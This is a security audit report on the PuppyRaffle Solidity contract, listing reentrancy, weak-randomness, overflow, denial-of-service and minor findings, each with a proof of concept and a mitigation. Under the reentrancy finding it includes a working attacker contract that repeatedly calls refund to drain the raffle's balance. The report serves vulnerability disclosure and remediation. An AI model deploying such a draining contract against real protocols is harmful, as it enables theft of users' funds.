---
title: Protocol Audit Report
author: Dhanesh Gujrathi
date: March 24, 2024
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
    \centering
    \begin{figure}[h]
        \centering
        \includegraphics[width=0.5\textwidth]{logo.pdf} 
    \end{figure}
    \vspace*{2cm}
    {\Huge\bfseries PuppyRaffle Audit Report\par}
    \vspace{1cm}
    {\Large Version 1.0\par}
    \vspace{2cm}
    {\Large\itshape Dhanesh Gujrathi\par}
    \vfill
    {\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Dhanesh Gujrathi](https://www.linkedin.com/in/dhanesh24g/)

Lead Security Researcher: 

- Dhanesh


# Table of Contents
- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
  - [Roles](#roles)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] Reentrancy attack in `PuppyRaffle::refund` function allows the entrant to drain raffle balance](#h-1-reentrancy-attack-in-puppyrafflerefund-function-allows-the-entrant-to-drain-raffle-balance)
    - [\[H-2\] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner \& influence or predict the winning puppy.](#h-2-weak-randomness-in-puppyraffleselectwinner-allows-users-to-influence-or-predict-the-winner--influence-or-predict-the-winning-puppy)
    - [\[H-3\] Integer overflow of `PuppyRaffle::totalFees` results in losing the fees](#h-3-integer-overflow-of-puppyraffletotalfees-results-in-losing-the-fees)
  - [Medium](#medium)
    - [\[M-1\] Looping through `players` array for checking duplicates in `PuppyRaffle::enterRaffle` is a potential Denial of Service (DoS) attack](#m-1-looping-through-players-array-for-checking-duplicates-in-puppyraffleenterraffle-is-a-potential-denial-of-service-dos-attack)
    - [\[M-2\] Smart contract wallet raffle winners without a `receive` or a `fallback` function will block the start of a new raffle contest](#m-2-smart-contract-wallet-raffle-winners-without-a-receive-or-a-fallback-function-will-block-the-start-of-a-new-raffle-contest)
  - [Low](#low)
    - [\[L-1\] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players \& for the player at index 0, which is misguiding for the player at index 0, thinking they have not entered the raffle.](#l-1-puppyrafflegetactiveplayerindex-returns-0-for-non-existent-players--for-the-player-at-index-0-which-is-misguiding-for-the-player-at-index-0-thinking-they-have-not-entered-the-raffle)
  - [Informational](#informational)
    - [\[I-1\] Solidity pragma should be specific, not wide](#i-1-solidity-pragma-should-be-specific-not-wide)
    - [\[I-2\] Using an outdated version of solidity is not recommended](#i-2-using-an-outdated-version-of-solidity-is-not-recommended)
    - [\[I-3\] Missing checks for `address(0)` when assigning values to address state variables](#i-3-missing-checks-for-address0-when-assigning-values-to-address-state-variables)
    - [\[I-4\] Use of 'Magic" number is discouraged](#i-4-use-of-magic-number-is-discouraged)
    - [\[I-5\] Events are missing for state changes](#i-5-events-are-missing-for-state-changes)
    - [\[I-6\] `PuppyRaffle::_isActivePlayer` is never used in the protocol \& should be removed](#i-6-puppyraffle_isactiveplayer-is-never-used-in-the-protocol--should-be-removed)
  - [Gas](#gas)
    - [\[G-1\] Unchanged state variables should be declared as constant or immutable.](#g-1-unchanged-state-variables-should-be-declared-as-constant-or-immutable)
    - [\[G-2\] Storage variables in a loop should be cached.](#g-2-storage-variables-in-a-loop-should-be-cached)

# Protocol Summary

This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

1. Call the `enterRaffle` function with the following parameters:
   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
2. Duplicate addresses are not allowed
3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.

## Roles

Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
Player - Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through `refund` function.

# Disclaimer

The DG Security team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details

**The findings described in this document correspond to the following commit hash:**
```
22bbbb2c47f3f2b78c1b134590baf41383fd354f
```

## Scope 

```
./src/
--- PuppyRaffle.sol
```

# Executive Summary

## Issues found

| Severity          | Number of issues Found |
| ----------------- | ---------------------- |
| High              | 3                      |
| Medium            | 2                      |
| Low               | 1                      |
| Info              | 6                      |
| Gas Optimizations | 2                      |
| Total             | 14                     |


# Findings

## High

### [H-1] Reentrancy attack in `PuppyRaffle::refund` function allows the entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow the CEI (Checks, Effects, Interactions) principle and as a result, it enables the entrant to drain the raffle contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address & after that update the `PuppyRaffle::players` array. 

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again & again till the raffle contract balance is drained.

**Impact:** All fees paid by the raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**  

1. Users enter the raffle.
2. Attacker sets up the contract with a `fallback` function that calls `PuppyRaffle::refund`.
3. Attacker enter the raffle.
4. Attacker calls the `PuppyRaffle::refund` function from their attack contract, draining the contract balance.

**Proof of Code:**

<details>
<summary>Code</summary>

Place the following into the `PuppyRaffleTest.t.sol`

```javascript
function testReentancyAttackPossible() public playersEntered {
        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(address(attacker), 1 ether);

        uint256 attackerContractInitialBalance = address(attackerContract).balance;
        uint256 raffleBalanceBeforeAttack = address(puppyRaffle).balance;

        console.log("Attack Contract Initial Balance -", attackerContractInitialBalance);
        console.log("Raffle Balance before Attack -", raffleBalanceBeforeAttack);

        vm.prank(attacker);
        attackerContract.attack{value: entranceFee}();

        uint256 attackerContractEndingBalance = address(attackerContract).balance;
        uint256 raffleBalanceAfterAttack = address(puppyRaffle).balance;

        console.log("Attack Contract After Balance -", attackerContractEndingBalance);
        console.log("Raffle Balance After Attack -", raffleBalanceAfterAttack);

        assert(attackerContractEndingBalance > attackerContractInitialBalance);
        assert(raffleBalanceAfterAttack < 1 ether);
    }
```

And place this contract as well.

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory newPlayers = new address[](1);
        newPlayers[0] = address(this);

        puppyRaffle.enterRaffle{value: entranceFee}(newPlayers);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= 1) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```
</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Also, the event emission should be moved up as well.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner & influence or predict the winning puppy.

**Description:** Hashing `msg.sender`, `block.timestamp` & `block.difficulty` together creates a predictable number. A predictable number is never a good random number. 
Malicious users can manipulate these values or know them ahead of the time to choose the raffle winner themselves.

*Note:* This also means that the users could front-run this function & call `refund` if they see that they are not the winner.

**Impact:** Any user can influence the winner of the raffle, winning the money & selecting the `rarest` puppy. This would make the entire raffle worthless if it becomes a gas-war as to who wins the raffle.

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` & `block.difficulty` and use them to predict when / how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was replaced with prevrandao.
2. User can mine / manipulate their `msg.sender` value to result in the address which would generate the winner.
3. Users can revert their `selectWinner` transaction, if they don't like the winner or the resulting puppy.

Using on-chain values to generate randomness is a well-documented attack vector in the blockchain space.

**Recommended Mitigation:** Consider using a cryptographilcally provable random number generator such as [Chainlink VRF](https://docs.chain.link/vrf).


### [H-3] Integer overflow of `PuppyRaffle::totalFees` results in losing the fees

**Description:** In solidity versions prior to `0.8.0`, integers were subject to integer overflows.

```javascript
uint64 var = type(uint64).max
// var = 18446744073709551615
var = var + 1 
// Above addition would result in var = 0
```

**Impact:** In `PuppyRaffle::selectWinner`, the `totalFees` are accumulated for the `feeAddress` to collect later the `PuppyRaffle::withdrawFees`. However if the `PuppyRaffle::totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving the fees permenantly stuck in the contract. 

**Proof of Concept:**

1. We run & conclude a raffle of 4 players.
2. Then we run & conclude another raffle with 89 players.
3. `totalFees` will be:
    ```javascript
    totalFees = totalFees + uint64(fee);
    // totalFees = 8e17 + 178e17
    // Above total will result in a wrong value / big loss
    totalFees = 1532e14
    ```
4. You will not be able to withdraw any fees, due to the line in `PuppyRaffle::withdrawFees` function:
    ```javascript
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    ```
   
Although you can use the `selfdestruct` function to force some ETH into the contract to match the values & withdraw fees, but this is not the intended design of the protocol. At some point, there will be so much `balance` in the contract that above line will be impossible to succeed.

**Recommended Mitigation:** There are a few possible mitigations:

1. Use a newer version of solidity & a `uint256` instead of `uint64` for `PuppyRaffle::totalFees` variable.
2. You could also use the `safeMath` library of the OpenZeppelin for older versions of solidity, but still you will have hard time managing the `uint64` balance, if too many fees are collected.
3. Remove the balance check from the `PuppyRaffle::withdrawFees` function: 

```diff
-   require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

There are more attack vectors with above require statement, so we recommend removing it anyway.

## Medium

### [M-1] Looping through `players` array for checking duplicates in `PuppyRaffle::enterRaffle` is a potential Denial of Service (DoS) attack

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array for checking the duplicates. However, the longer the `PuppyRaffle::players` array is, more would be the iterations for any new entrants. This means the players joining the raffle at the beginning would have to pay way lesser gas than the ones joining later.   

**Impact:** The gas cost will significantly increase as more players start joining the raffle. This would discourage the users from joining the raffle & can cause rush at the very beginning of starting the raffle.

An attacker can make the `PuppyRaffle::players` array so big, that nobody else could enter.

```javascript
        // @audit - DoS Attack 
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Proof of Concept:**

If we have 2 sets of 100 entrants each, the gas cost would be like -
First set of 100 players  : ~6252089
Second set of 100 players : ~18067756

Joining the raffle would be around 3 times expensive for the second set of 100 players.

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function testDenialOfServiceWhileEnteringRaffle() public {
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        address[] memory playersNew = new address[](playersNum);

        for (uint160 i = 0; i < playersNum; i++) {
            players[i] = address(i);
            playersNew[i] = address(i + playersNum);
        }

        uint256 gasAtStart1 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasAtEnd1 = gasAtStart1 - gasleft();

        console.log("Gas used for first 100 - ", gasAtEnd1);

        uint256 gasAtStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNew.length}(playersNew);
        uint256 gasAtEnd2 = gasAtStart2 - gasleft();

        console.log("Gas used for next 100 - ", gasAtEnd2);

        assert(gasAtEnd2 > gasAtEnd1);
    }
```
</details>

**Recommended Mitigation:** 

We can use any of the 2 methodologies - 

1. We can remove the functionality of checking for duplicates, as this functionality only stops a person from entering the raffle with the same wallet address. But the person can enter multiple times with different wallet addresses.

2. We can introduce an addressToUint map, where an address will be assigned the raffleId. With this, we will check duplicates only for new users & using map will have a constant time lookup.


### [M-2] Smart contract wallet raffle winners without a `receive` or a `fallback` function will block the start of a new raffle contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, then the new lottery would not be able to start.

Users could still call the `enterRaffle` function again & a non-wallet entrants could enter, but it would cost a lot due to the duplicate check & resetting the lottery could get very challenging.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, making a lottery reset difficult.

Also, the true winners would not get paid out & someone else could take their winning amount.

**Proof of Concept:**

1. 10 smart contract wallets enter the lottery without a `fallback` or a `receive` function.
2. The lottery ends.
3. The `selectWinner` function would not work even if the lottery is over.

**Recommended Mitigation:** Create a mapping of `addresses -> payoutAmount`, so the winners can pull their funds by themselves with a new `claimPrize` function, putting the onus on the winner to claim their prize. (Pull over Push)


## Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players & for the player at index 0, which is misguiding for the player at index 0, thinking they have not entered the raffle. 

**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this function will return 0, but according to the natspec, the fuction will also return 0 when the player is not in the array.

```javascript
    /// @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**Impact:** It is misguiding for the player at index 0, making them think they have not entered the raffle & attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enters the raffle & they are the first entrant.
2. `PuppyRaffle::getActivePlayerIndex` returns 0 for the first entrant.
3. User thinks they have not entered the raffle correctly, as per the function documentation.

**Recommended Mitigation:** The easiest recommendation would be to revert the function call, if the player is not in the array, instead of returning 0.

A better solution might be to return an `int256` value from the function where it returns -1 if the player is not active.


## Informational

### [I-1] Solidity pragma should be specific, not wide

**Description:** Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol [Line: 2](../src/PuppyRaffle.sol#L2)

	```solidity
	pragma solidity ^0.7.6;
	```

### [I-2] Using an outdated version of solidity is not recommended

**Description:** solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation:**
Deploy with any of the following Solidity versions:

`0.8.18`
The recommendations to be taken into account:
-   Risks related to recent releases
-   Risks of complex code generation changes
-   Risks of new language features
-   Risks of known bugs
-   Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

**Description:** Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 69](../src/PuppyRaffle.sol#L69)
- Found in src/PuppyRaffle.sol [Line: 182](../src/PuppyRaffle.sol#L182)
- Found in src/PuppyRaffle.sol [Line: 204](../src/PuppyRaffle.sol#L204)


### [I-4] Use of 'Magic" number is discouraged

**Description:** It can be confusing to see the number literals in the codebase & the code becomes much more readable if the numbers are given a name.

Examples: 
```solidity
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
```

Instead, you can use:
```solidity
        uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
        uint256 public constant FEE_PERCENTAGE = 20;
        uint256 public constant POOL_PRECISION = 100;
```

### [I-5] Events are missing for state changes

**Description:** Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields). Each event should use three indexed fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.

- Found in src/PuppyRaffle.sol [Line: 58](../src/PuppyRaffle.sol#L58)
- Found in src/PuppyRaffle.sol [Line: 59](../src/PuppyRaffle.sol#L59)
- Found in src/PuppyRaffle.sol [Line: 60](../src/PuppyRaffle.sol#L60)


### [I-6] `PuppyRaffle::_isActivePlayer` is never used in the protocol & should be removed

**Description:** The function `_isActivePlayer` is never used, so should be removed.

```diff
-    function _isActivePlayer() internal view returns (bool) {
-        for (uint256 i = 0; i < players.length; i++) {
-            if (players[i] == msg.sender) {
-                return true;
-            }
-        }
-        return false;
-    }
```

## Gas

### [G-1] Unchanged state variables should be declared as constant or immutable.

Reading from storage is much more expensive that reading from a constant or immutable variable.

Instances: 
-   `PuppyRaffle::raffleDuration` should be `immutable`
-   `PuppyRaffle::commonImageUri` should be `constant`
-   `PuppyRaffle::rareImageUri` should be `constant`
-   `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] Storage variables in a loop should be cached.

Everytime you call `players.length` you read from storage, as opposed to the memory which is more gas efficient.

```diff
+       uint256 playerLength = players.length;
-       for (uint256 i = 0; i < players.length - 1; i++) {
+       for (uint256 i = 0; i < playerLength - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < playerLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```
